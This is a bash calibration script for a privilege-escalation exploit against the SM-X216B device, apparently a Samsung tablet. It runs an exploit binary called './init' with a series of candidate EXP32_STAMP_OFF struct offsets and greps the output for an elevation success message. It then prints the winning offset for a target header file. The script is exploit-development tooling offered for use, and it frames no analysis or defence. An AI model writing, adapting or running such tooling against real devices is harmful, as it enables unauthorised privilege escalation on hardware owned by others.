#!/bin/bash
# calibrate.sh - Test EXP32_STAMP_OFF values for SM-X216B 5.4
# Usage: ./calibrate.sh

set -e

OFFSETS=(0x48 0x50 0x58 0x60 0x68 0x70 0x78)
WINNING_OFFSET=""

echo "========================================="
echo "SM-X216B EXP32_STAMP_OFF Calibration"
echo "========================================="

for OFF in "${OFFSETS[@]}"; do
    echo ""
    echo "========== Testing EXP32_STAMP_OFF=$OFF =========="

    # Run exploit with this offset
    EXP32_STAMP_OFF=$OFF timeout 30 ./init 2>&1 | tee /tmp/test_$OFF.log

    # Check if exploit succeeded
    if grep -q "SUCCESS.*elevation" /tmp/test_$OFF.log 2>/dev/null; then
        echo "[SUCCESS] Offset $OFF works!"
        WINNING_OFFSET=$OFF
        break
    else
        echo "[FAIL] Offset $OFF did not work"
    fi
done

echo ""
echo "========================================="
if [ -n "$WINNING_OFFSET" ]; then
    echo "WINNING OFFSET: $WINNING_OFFSET"
    echo ""
    echo "Update src/targets/sm-x216b.h with:"
    echo "#define EXP32_STAMP_OFF $WINNING_OFFSET"
else
    echo "No working offset found in tested range."
    echo "Try broader offsets: 0x40-0x80"
fi
echo "========================================="
